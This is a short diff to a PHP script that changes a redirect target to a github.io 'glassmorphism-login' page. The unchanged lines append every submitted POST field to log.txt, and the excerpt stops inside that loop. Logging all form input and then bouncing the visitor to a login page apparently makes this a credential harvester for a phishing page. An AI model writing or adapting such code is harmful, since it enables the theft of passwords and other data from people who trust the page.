@@ -1,5 +1,5 @@
 <?php
-header ('Location:http://127.0.0.1:5500/dist/index.html');
+header ('Location:https://vinhnt1006.github.io/FPT/HTML/glassmorphism-login/dist/index.html?');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
